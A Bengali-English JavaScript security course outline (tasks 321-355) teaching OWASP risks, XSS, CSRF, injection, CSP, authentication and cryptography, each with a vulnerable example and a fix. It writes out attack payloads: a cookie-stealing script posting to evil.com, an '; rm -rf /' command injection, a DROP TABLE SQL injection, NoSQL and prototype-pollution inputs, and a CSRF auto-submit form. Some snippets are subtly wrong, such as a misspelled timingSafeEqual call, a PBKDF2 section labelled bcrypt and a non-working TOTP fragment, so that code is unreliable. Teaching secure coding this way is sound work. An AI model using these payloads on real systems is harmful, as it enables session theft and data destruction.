# JS Phase 11 — Security & Hardening (Tasks 321-355)

> Code লিখতে পারাটা শুরু — secure code লিখতে পারাটা professional। যেকোনো company তে security expert হলে তুমি irreplaceable।
> Phase 09 এ 6টা basic security task ছিল। এখানে 35টা deep security task — OWASP, Crypto, Auth, CSP, attack vectors — সব cover করবে।

---

## Section A: Web Security Fundamentals (Tasks 321-328)

### Task 321 — OWASP Top 10 Deep Dive 🟡

- সব 10টা vulnerability study ও demonstrate করো:
  1. **Broken Access Control** — unauthorized access
  2. **Cryptographic Failures** — weak encryption, exposed data
  3. **Injection** — SQL, NoSQL, OS command injection
  4. **Insecure Design** — missing security controls
  5. **Security Misconfiguration** — default configs, open ports
  6. **Vulnerable Components** — outdated dependencies
  7. **Authentication Failures** — weak auth, session issues
  8. **Software Integrity Failures** — untrusted updates, CI/CD
  9. **Logging Failures** — insufficient monitoring
  10. **SSRF** — Server-Side Request Forgery
  - **Output:** প্রতিটা vulnerability র জন্য: explain → demo attack → implement fix

### Task 322 — Cross-Site Scripting (XSS) — All Types 🔴

- তিন ধরনের XSS:
  - **Stored XSS:** malicious script database এ save হয়

    ```js
    // ATTACK: User submits this as "comment"
    <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>;

    // VULNERABLE: Direct innerHTML
    commentDiv.innerHTML = userComment; // Executes the script!

    // FIX: Use textContent
    commentDiv.textContent = userComment; // Safe — treated as text
    ```

  - **Reflected XSS:** malicious script URL parameter এ
    ```
    https://site.com/search?q=<script>alert('xss')</script>
    ```
  - **DOM-based XSS:** client-side JS দিয়ে inject
    ```js
    // VULNERABLE:
    document.getElementById('output').innerHTML = location.hash.slice(1);
    // URL: site.com#<img src=x onerror=alert('xss')>
    ```
  - **Build:**
    1. Vulnerable app (intentionally) — show all 3 XSS types
    2. Secure version — with proper sanitization
    3. DOMPurify-like sanitizer from scratch
    4. Content Security Policy (CSP) headers to block XSS

### Task 323 — Cross-Site Request Forgery (CSRF) 🔴

- CSRF attack ও prevention:
  - **Attack scenario:**
    ```html
    <!-- Evil site has this hidden form -->
    <form action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="amount" value="10000" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
    ```
  - **Prevention methods:**
    1. **CSRF Token:** random token in form + verify on server
    2. **SameSite Cookie:** `Set-Cookie: session=abc; SameSite=Strict`
    3. **Double Submit Cookie:** cookie + request header match
    4. **Origin/Referer Header Check:** verify request origin
  - **Build:**
    1. Vulnerable app (demo CSRF attack)
    2. CSRF token implementation (server + client)
    3. SameSite cookie demo
    4. Token rotation system

### Task 324 — Injection Attacks (SQL, NoSQL, Command) 🔴

- Different injection types:
  - **SQL Injection:**

    ```js
    // VULNERABLE:
    const query = `SELECT * FROM users WHERE name = '${userInput}'`;
    // Attack: userInput = "'; DROP TABLE users; --"

    // FIX: Parameterized queries
    db.query('SELECT * FROM users WHERE name = ?', [userInput]);
    ```

  - **NoSQL Injection:**

    ```js
    // VULNERABLE (MongoDB-style):
    db.users.find({ username: req.body.username, password: req.body.password });
    // Attack: { "username": "admin", "password": { "$ne": "" } }

    // FIX: Validate input types
    if (typeof password !== 'string') throw new Error('Invalid input');
    ```

  - **Command Injection:**

    ```js
    // VULNERABLE:
    exec(`ls ${userInput}`); // Attack: "; rm -rf /"

    // FIX: Use execFile with args array
    execFile('ls', [userInput]);
    ```

  - **Prototype Pollution:**

    ```js
    // VULNERABLE:
    merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));

    // FIX: Check for __proto__, constructor, prototype keys
    ```

  - **Build:** 4টা vulnerable app → 4টা secure version

### Task 325 — Content Security Policy (CSP) 🟡

- HTTP header-based security:
  - **CSP directives:**
    ```
    Content-Security-Policy:
      default-src 'self';
      script-src 'self' 'nonce-abc123';
      style-src 'self' 'unsafe-inline';
      img-src 'self' https://cdn.example.com;
      connect-src 'self' https://api.example.com;
      font-src 'self' https://fonts.googleapis.com;
      frame-ancestors 'none';
      base-uri 'self';
      form-action 'self';
    ```
  - **Nonce-based script loading:**
    ```html
    <script nonce="abc123">
      /* Allowed */
    </script>
    <script>
      /* Blocked by CSP! */
    </script>
    ```
  - **Report-Only mode:** test CSP without blocking
  - **report-uri / report-to:** get violation reports
  - **Build:**
    1. Node.js server with proper CSP headers
    2. CSP violation reporter (collect & display violations)
    3. Test: try XSS attacks → verify CSP blocks them
    4. Progressive CSP implementation guide

### Task 326 — Clickjacking & UI Redressing 🟡

- Frame-based attacks:
  - **Attack:** embed target site in invisible iframe, trick user to click
    ```html
    <iframe src="https://bank.com/transfer" style="opacity: 0; position: absolute;"></iframe>
    <button style="position: relative; z-index: -1;">Click for Prize!</button>
    ```
  - **Prevention:**
    - `X-Frame-Options: DENY` header
    - CSP `frame-ancestors 'none'`
    - JavaScript frame-busting:
      ```js
      if (window.self !== window.top) {
        window.top.location = window.self.location;
      }
      ```
  - **Build:** Demo clickjacking attack + all prevention methods

### Task 327 — HTTP Security Headers 🟡

- Essential security headers:
  ```
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  X-XSS-Protection: 0    (deprecated, use CSP instead)
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  Cross-Origin-Embedder-Policy: require-corp
  Cross-Origin-Opener-Policy: same-origin
  Cross-Origin-Resource-Policy: same-origin
  ```

  - **Build:**
    1. Node.js middleware that adds ALL security headers
    2. Security header scanner tool (check any URL's headers)
    3. Report card: A+ to F rating based on headers present

### Task 328 — CORS Deep Dive 🟡

- Cross-Origin Resource Sharing:
  - **Simple requests:** GET, HEAD, POST (certain content types)
  - **Preflight requests:** OPTIONS request before actual request
    ```
    OPTIONS /api/data HTTP/1.1
    Origin: https://frontend.com
    Access-Control-Request-Method: PUT
    Access-Control-Request-Headers: Content-Type, Authorization
    ```
  - **Server response:**
    ```
    Access-Control-Allow-Origin: https://frontend.com
    Access-Control-Allow-Methods: GET, POST, PUT, DELETE
    Access-Control-Allow-Headers: Content-Type, Authorization
    Access-Control-Allow-Credentials: true
    Access-Control-Max-Age: 86400
    ```
  - **Common mistakes:**
    - `Access-Control-Allow-Origin: *` with credentials — NOT allowed
    - Not handling OPTIONS preflight
    - Reflecting Origin header without validation
  - **Build:**
    1. CORS middleware from scratch (Node.js)
    2. Demo: different CORS scenarios (simple, preflight, credentialed)
    3. CORS debugging tool

---

## Section B: Authentication & Authorization (Tasks 329-336)

### Task 329 — Password Hashing & Storage 🔴

- Secure password handling:
  - **NEVER store plain text passwords**
  - **bcrypt** algorithm (Node.js `crypto`):

    ```js
    const crypto = require('crypto');

    function hashPassword(password) {
      const salt = crypto.randomBytes(16).toString('hex');
      const hash = crypto.pbkdf2Sync(password, salt, 100000, 64, 'sha512').toString('hex');
      return `${salt}:${hash}`;
    }

    function verifyPassword(password, stored) {
      const [salt, hash] = stored.split(':');
      const verify = crypto.pbkdf2Sync(password, salt, 100000, 64, 'sha512').toString('hex');
      return crypto.timingsSafeEqual(Buffer.from(hash), Buffer.from(verify));
    }
    ```

  - **Timing-safe comparison:** prevent timing attacks
  - **Salt:** unique per password, prevents rainbow table attacks
  - **Iterations:** slow hashing (100k+) — deliberate
  - **Build:** Complete password management system with strength meter

### Task 330 — JWT (JSON Web Token) Deep Dive 🔴

- Token-based authentication:
  - **JWT structure:** Header.Payload.Signature

    ```js
    // Header
    { "alg": "HS256", "typ": "JWT" }

    // Payload
    { "sub": "user123", "name": "John", "iat": 1516239022, "exp": 1516325422 }

    // Signature
    HMACSHA256(base64(header) + "." + base64(payload), secret)
    ```

  - **Build JWT library from scratch:**
    - `sign(payload, secret, options)` — create token
    - `verify(token, secret)` — verify & decode
    - `decode(token)` — decode without verification
    - Expiration check
    - Audience & issuer validation
  - **Security concerns:**
    - Token storage: `httpOnly` cookie vs localStorage
    - Token refresh strategy (refresh token rotation)
    - Token revocation (blacklist)
    - `alg: "none"` attack prevention
  - **Build:** Complete auth system with access + refresh tokens

### Task 331 — OAuth 2.0 Flow Implementation 🔴

- OAuth 2.0 from scratch:
  - **Authorization Code Flow:**
    1. User → Auth Server (login)
    2. Auth Server → redirect with `code`
    3. App Server → exchange `code` for `access_token`
    4. App Server → use `access_token` to access resources
  - **PKCE (Proof Key for Code Exchange):** for public clients
    - `code_verifier` — random string
    - `code_challenge` — SHA256 hash of verifier
  - **Build:**
    1. OAuth authorization server (Node.js)
    2. OAuth client application
    3. Resource server (protected API)
    4. Implement all 4 grant types:
       - Authorization Code (+ PKCE)
       - Client Credentials
       - Device Code
       - Refresh Token

### Task 332 — Session Management 🟡

- Server-side session security:
  - **Session creation:** generate cryptographically random session ID
  - **Session storage:** in-memory (dev), file-based, database
  - **Cookie security:**
    ```
    Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
    ```
  - **Session fixation prevention:** regenerate session ID after login
  - **Session hijacking prevention:** bind to IP, user-agent fingerprint
  - **Idle timeout & absolute timeout**
  - **Build:**
    1. Session middleware from scratch (Node.js)
    2. Session store (memory + file-based)
    3. Session fixation attack demo + prevention
    4. Concurrent session control (max 3 sessions per user)

### Task 333 — Role-Based Access Control (RBAC) 🟡

- Authorization system:
  - **Roles:** admin, editor, viewer, custom roles
  - **Permissions:** create, read, update, delete per resource
  - **Role-Permission mapping:**
    ```js
    const roles = {
      admin: ['users:*', 'posts:*', 'settings:*'],
      editor: ['posts:create', 'posts:read', 'posts:update'],
      viewer: ['posts:read'],
    };
    ```
  - **Middleware:**
    ```js
    function authorize(permission) {
      return (req, res, next) => {
        if (hasPermission(req.user.role, permission)) next();
        else res.status(403).send('Forbidden');
      };
    }
    ```
  - **Build:**
    1. RBAC library with wildcard permissions
    2. Dynamic role creation & permission assignment
    3. Role hierarchy (admin inherits from editor)
    4. API with RBAC middleware

### Task 334 — Multi-Factor Authentication (MFA) 🔴

- 2FA/MFA implementation:
  - **TOTP (Time-based OTP):**
    - Generate secret key (base32)
    - Generate 6-digit code from secret + time
    - Verify code (with time window tolerance)
    - QR code generation for authenticator apps
    ```js
    function generateTOTP(secret, time = Date.now()) {
      const epoch = Math.floor(time / 1000 / 30); // 30-second window
      const hmac = crypto.createHmac('sha1', Buffer.from(secret, 'base32'));
      hmac.update(Buffer.alloc(8));
      // ... truncate to 6 digits
    }
    ```
  - **Backup codes:** one-time use recovery codes
  - **Build:**
    1. TOTP library from scratch
    2. QR code generator (Canvas)
    3. Complete MFA login flow
    4. Recovery code system

### Task 335 — API Key Authentication 🟡

- API security:
  - **Key generation:** cryptographically random, prefixed (`pk_live_...`)
  - **Key storage:** hash keys, never store plain text
  - **Key rotation:** generate new, deprecate old
  - **Scoped keys:** restrict to specific endpoints/actions
  - **Rate limiting per key**
  - **Key revocation:** immediate invalidation
  - **Build:**
    1. API key management system
    2. Key generation with prefixes (live/test)
    3. Scoped permissions per key
    4. Usage analytics per key

### Task 336 — WebAuthn / Passwordless Authentication 🔴

- Modern authentication:
  - **WebAuthn API:**

    ```js
    // Registration
    const credential = await navigator.credentials.create({
      publicKey: {
        challenge: new Uint8Array(32),
        rp: { name: 'My App' },
        user: { id: userId, name: 'john@example.com', displayName: 'John' },
        pubKeyCredParams: [{ alg: -7, type: 'public-key' }],
      },
    });

    // Authentication
    const assertion = await navigator.credentials.get({
      publicKey: { challenge, allowCredentials: [{ id: credentialId, type: 'public-key' }] },
    });
    ```

  - **Build:**
    1. WebAuthn registration flow
    2. WebAuthn authentication flow
    3. Server-side credential verification
    4. Fallback to password + MFA

---

## Section C: Cryptography in JavaScript (Tasks 337-344)

### Task 337 — Web Crypto API 🟡

- Browser-native cryptography:

  ```js
  // Generate key
  const key = await crypto.subtle.generateKey({ name: 'AES-GCM', length: 256 }, true, [
    'encrypt',
    'decrypt',
  ]);

  // Encrypt
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    new TextEncoder().encode('secret message')
  );

  // Decrypt
  const decrypted = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, key, encrypted);
  ```

  - Algorithms: AES-GCM, AES-CBC, RSA-OAEP, ECDSA, HMAC, SHA-256/384/512
  - **Build:** Encryption/decryption tool using Web Crypto API

### Task 338 — Symmetric Encryption Implementation 🔴

- Build encryption from scratch (educational):
  - **XOR cipher:** simplest encryption (show why it's weak)
  - **AES-like block cipher:**
    - SubBytes, ShiftRows, MixColumns, AddRoundKey
    - Key expansion
    - Multiple rounds
  - **Block cipher modes:** ECB (weak), CBC, CTR, GCM
  - **Padding:** PKCS7
  - **Build:**
    1. XOR cipher implementation
    2. Simplified AES implementation (educational)
    3. CBC mode implementation
    4. Compare with Web Crypto API output

### Task 339 — Asymmetric Encryption & Digital Signatures 🔴

- Public key cryptography:
  - **RSA concepts:**
    - Key pair generation (p, q primes → n, e, d)
    - Encrypt with public key, decrypt with private key
    - Sign with private key, verify with public key
  - **ECDSA (Elliptic Curve):**
    - Smaller keys, same security
    - Sign & verify
  - **Node.js crypto:**

    ```js
    const { generateKeyPairSync, sign, verify } = require('crypto');

    const { publicKey, privateKey } = generateKeyPairSync('rsa', {
      modulusLength: 2048,
    });

    const signature = sign('sha256', Buffer.from(data), privateKey);
    const isValid = verify('sha256', Buffer.from(data), publicKey, signature);
    ```

  - **Build:**
    1. Message signing & verification system
    2. Simple PKI (Public Key Infrastructure)
    3. Certificate chain verification (basic)

### Task 340 — Hashing & Integrity 🟡

- Cryptographic hashing:
  - **Hash algorithms:** MD5 (broken), SHA-1 (deprecated), SHA-256, SHA-512
  - **Properties:** one-way, deterministic, avalanche effect, collision-resistant
  - **Use cases:** password storage, data integrity, checksums
  - **HMAC (Hash-based Message Authentication Code):**
    ```js
    const hmac = crypto.createHmac('sha256', secret);
    hmac.update(message);
    const mac = hmac.digest('hex');
    ```
  - **Build:**
    1. SHA-256 implementation from scratch (educational)
    2. File integrity checker (hash files, detect changes)
    3. HMAC-based API request signing
    4. Merkle tree implementation

### Task 341 — Secure Random Number Generation 🟡

- Crypto-safe randomness:
  - **NEVER use `Math.random()` for security** (predictable PRNG)
  - Browser: `crypto.getRandomValues()`
  - Node.js: `crypto.randomBytes()`, `crypto.randomUUID()`
  - **Build:**
    1. Secure random ID generator (UUID v4, nanoid-like)
    2. Secure token generator (URL-safe, configurable length)
    3. Random password generator (with strength requirements)
    4. Cryptographically secure shuffle algorithm

### Task 342 — End-to-End Encryption (E2EE) 🔴

- Build secure messaging:
  - **Key exchange:** Diffie-Hellman (ECDH)

    ```js
    // Alice
    const alice = crypto.createECDH('secp256k1');
    alice.generateKeys();
    const alicePublic = alice.getPublicKey();

    // Bob
    const bob = crypto.createECDH('secp256k1');
    bob.generateKeys();
    const bobPublic = bob.getPublicKey();

    // Shared secret (same on both sides!)
    const aliceSecret = alice.computeSecret(bobPublic);
    const bobSecret = bob.computeSecret(alicePublic);
    // aliceSecret === bobSecret
    ```

  - **Message encryption:** AES-GCM with shared secret
  - **Forward secrecy:** new key per session
  - **Build:** E2EE chat application:
    1. Key exchange between users (ECDH)
    2. Encrypt messages with shared key (AES-GCM)
    3. Server can't read messages (zero-knowledge)
    4. Key rotation per conversation

### Task 343 — Secure Data Storage 🟡

- Client-side data protection:
  - **localStorage is NOT secure** (any JS can read it)
  - **Encrypt before storing:**

    ```js
    async function secureStore(key, data, encryptionKey) {
      const encrypted = await encrypt(JSON.stringify(data), encryptionKey);
      localStorage.setItem(key, encrypted);
    }

    async function secureRetrieve(key, encryptionKey) {
      const encrypted = localStorage.getItem(key);
      return JSON.parse(await decrypt(encrypted, encryptionKey));
    }
    ```

  - **Key derivation from password:** PBKDF2
  - **IndexedDB encryption**
  - **Build:**
    1. Encrypted localStorage wrapper
    2. Encrypted IndexedDB wrapper
    3. Password-derived key system (PBKDF2)
    4. Secure note-taking app (encrypted at rest)

### Task 344 — Certificate & TLS Basics 🟡

- HTTPS fundamentals:
  - **TLS handshake:** client hello → server hello → certificate → key exchange → encrypted
  - **Self-signed certificate creation** (Node.js):

    ```js
    const https = require('https');
    const fs = require('fs');

    const server = https.createServer({
      key: fs.readFileSync('key.pem'),
      cert: fs.readFileSync('cert.pem'),
    }, (req, res) => { ... });
    ```

  - **Certificate chain:** root CA → intermediate CA → server cert
  - **Certificate pinning:** verify specific cert/public key
  - **Build:**
    1. HTTPS server with self-signed cert
    2. Certificate info viewer (parse cert details)
    3. Mutual TLS (mTLS) demo

---

## Section D: Advanced Security Patterns (Tasks 345-355)

### Task 345 — Input Validation & Sanitization Library 🔴

- Build a complete validation library:

  ```js
  const schema = v.object({
    name: v.string().min(2).max(50).trim(),
    email: v.string().email(),
    age: v.number().int().min(13).max(120),
    password: v
      .string()
      .min(8)
      .regex(/[A-Z]/)
      .regex(/[0-9]/)
      .regex(/[!@#$%]/),
    website: v.string().url().optional(),
    tags: v.array(v.string().max(20)).max(5),
  });

  const result = schema.validate(input);
  // { success: false, errors: [{ path: 'password', message: 'Must contain uppercase' }] }
  ```

  - **Features:**
    - Type validation (string, number, boolean, array, object)
    - String: min, max, email, url, regex, trim, lowercase, uppercase
    - Number: min, max, int, positive, negative
    - Array: min, max, unique, of(schema)
    - Object: nested schemas, unknown keys handling
    - Custom validators
    - Error messages (customizable)
    - Sanitization: trim, escape HTML, strip tags

### Task 346 — Rate Limiting & DDoS Protection 🟡

- Protect against abuse:
  - **Rate limiting algorithms:**
    - Fixed window: X requests per Y seconds
    - Sliding window: smoother limits
    - Token bucket: burst allowance
    - Leaky bucket: steady rate

    ```js
    class TokenBucket {
      constructor(capacity, refillRate) {
        this.capacity = capacity;
        this.tokens = capacity;
        this.refillRate = refillRate; // tokens per second
        this.lastRefill = Date.now();
      }

      consume(tokens = 1) {
        this.refill();
        if (this.tokens >= tokens) {
          this.tokens -= tokens;
          return true;
        }
        return false;
      }

      refill() {
        const now = Date.now();
        const elapsed = (now - this.lastRefill) / 1000;
        this.tokens = Math.min(this.capacity, this.tokens + elapsed * this.refillRate);
        this.lastRefill = now;
      }
    }
    ```

  - **Build:**
    1. Rate limiter middleware (all 4 algorithms)
    2. Per-IP and per-user limiting
    3. Rate limit headers: `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `Retry-After`
    4. DDoS simulation & protection demo

### Task 347 — Secure File Upload 🟡

- File upload security:
  - **Validate file type:** check magic bytes, not just extension
    ```js
    function getFileType(buffer) {
      const header = new Uint8Array(buffer.slice(0, 4));
      if (header[0] === 0xff && header[1] === 0xd8) return 'image/jpeg';
      if (header[0] === 0x89 && header[1] === 0x50) return 'image/png';
      if (header[0] === 0x47 && header[1] === 0x49) return 'image/gif';
      if (header[0] === 0x25 && header[1] === 0x50) return 'application/pdf';
      return 'unknown';
    }
    ```
  - **Validate file size** (server-side, not just client)
  - **Rename files** (never use original filename)
  - **Store outside web root**
  - **Scan for malware** (basic signature check)
  - **Image reprocessing** (re-encode to strip metadata/embedded scripts)
  - **Build:**
    1. Secure file upload server
    2. Magic byte file type detector
    3. Image metadata stripper
    4. File quarantine system

### Task 348 — Dependency Security Audit 🟡

- Supply chain security:
  - **npm audit:** understand vulnerability reports
  - **Lockfile integrity:** verify `package-lock.json` hashes
  - **Build:**
    1. Dependency scanner (read package.json, check for known vulnerabilities)
    2. Lockfile integrity verifier
    3. License checker (detect GPL in commercial project)
    4. Unused dependency detector
    5. Version freshness checker (how outdated are dependencies?)

### Task 349 — Secure Error Handling 🟡

- Don't leak information through errors:
  - **NEVER show stack traces in production**
  - **Generic error messages to client:**

    ```js
    // BAD:
    res.status(500).json({ error: err.stack }); // Reveals file paths, code structure!

    // GOOD:
    const errorId = crypto.randomUUID();
    logger.error({ errorId, err }); // Log details server-side
    res.status(500).json({ error: 'Internal server error', errorId }); // Generic to client
    ```

  - **Error codes** instead of messages
  - **Build:**
    1. Secure error handler middleware
    2. Error logging system (with correlation IDs)
    3. Client-side error boundary (graceful degradation)

### Task 350 — Secure Communication Patterns 🔴

- Beyond HTTPS:
  - **Request signing:**
    ```js
    function signRequest(method, url, body, secret) {
      const timestamp = Date.now().toString();
      const payload = `${method}\n${url}\n${timestamp}\n${JSON.stringify(body)}`;
      const signature = crypto.createHmac('sha256', secret).update(payload).digest('hex');
      return { timestamp, signature };
    }
    ```
  - **Webhook verification:** verify webhook signatures
  - **API versioning security:** old versions may have known vulnerabilities
  - **Build:**
    1. Request signing system (like AWS Signature V4)
    2. Webhook receiver with signature verification
    3. Signed URL generator (time-limited access)

### Task 351 — Sandbox & Isolation 🔴

- Run untrusted code safely:
  - **iframe sandbox:**
    ```html
    <iframe sandbox="allow-scripts" src="untrusted.html"></iframe>
    ```
  - **Web Workers:** separate thread, no DOM access
  - **Node.js `vm` module:**
    ```js
    const vm = require('vm');
    const context = vm.createContext({ console: { log: console.log } });
    vm.runInContext('console.log("hello")', context, { timeout: 1000 });
    ```
  - **Realm-like isolation:** separate global scope
  - **Build:**
    1. Safe code executor (browser — iframe sandbox)
    2. Safe code executor (Node.js — vm module)
    3. Plugin system with sandboxed execution
    4. Time & memory limited execution

### Task 352 — Security Logging & Monitoring 🟡

- Detect attacks in real-time:
  - **What to log:**
    - Authentication attempts (success & failure)
    - Authorization failures
    - Input validation failures
    - Rate limit hits
    - Error spikes
    - Unusual patterns
  - **Log format:** structured JSON with correlation IDs
  - **Alert rules:**
    - 5+ failed logins in 1 minute → alert
    - Rate limit hit > 100 times per IP → block IP
    - Error rate > 10% → alert
  - **Build:**
    1. Security event logger
    2. Real-time alert system (WebSocket dashboard)
    3. IP reputation tracker
    4. Anomaly detection (basic statistical)

### Task 353 — Secure Configuration Management 🟡

- Never hardcode secrets:
  - **Environment variables:** `process.env.DB_PASSWORD`
  - **Config validation at startup:**
    ```js
    const requiredEnvVars = ['DB_HOST', 'DB_PASSWORD', 'JWT_SECRET', 'API_KEY'];
    for (const envVar of requiredEnvVars) {
      if (!process.env[envVar]) {
        console.error(`Missing required env var: ${envVar}`);
        process.exit(1);
      }
    }
    ```
  - **Secret rotation:** change secrets without downtime
  - **`.env` file security:** never commit, add to .gitignore
  - **Build:**
    1. Config manager with validation
    2. Secret rotation system
    3. Environment-specific configs (dev/staging/prod)
    4. Encrypted config file support

### Task 354 — Penetration Testing Toolkit 🔴

- Build security testing tools:
  - **Port scanner:** check open ports on a server
  - **Header analyzer:** check security headers
  - **SSL/TLS checker:** verify certificate details
  - **Directory bruteforcer:** find hidden paths
  - **Parameter fuzzer:** test inputs with edge cases
  - **Vulnerability reporter:** generate security audit report
  - **Build:**
    1. HTTP security scanner (checks headers, SSL, cookies)
    2. Input fuzzer (test XSS, injection payloads)
    3. Authentication tester (brute force detection)
    4. Security report generator (HTML report)
  - ⚠️ **IMPORTANT:** Only use on YOUR OWN applications. Never attack others' systems.

### Task 355 — Build: Complete Secure Application ⚫

- Put it all together — build a production-secure app:
  - **Authentication:** JWT + refresh tokens + MFA
  - **Authorization:** RBAC with granular permissions
  - **Input validation:** all inputs validated & sanitized
  - **XSS protection:** CSP headers + output encoding
  - **CSRF protection:** SameSite cookies + CSRF tokens
  - **SQL injection protection:** parameterized queries
  - **Rate limiting:** per-user and per-IP
  - **Secure headers:** all HTTP security headers
  - **HTTPS only:** with proper TLS config
  - **Logging:** security events with correlation IDs
  - **Error handling:** no information leakage
  - **File upload:** magic byte validation, size limits
  - **Dependencies:** audit, lockfile verification
  - **Config:** environment variables, no hardcoded secrets
  - **This is your "Security Showcase" project for portfolio**

---

## ✅ Phase 11 Completion Checklist

- [ ] All 35 tasks complete
- [ ] Can explain OWASP Top 10 with code examples
- [ ] Can find ও fix XSS, CSRF, injection vulnerabilities
- [ ] Built JWT auth system from scratch
- [ ] Built OAuth 2.0 server
- [ ] Understand cryptography (symmetric, asymmetric, hashing)
- [ ] Built E2EE chat application
- [ ] Built penetration testing tools
- [ ] Built a production-secure application
- [ ] Can conduct security audit on any JavaScript application

> **তুমি এখন security expert — যেকোনো company তে high demand।** 🔒
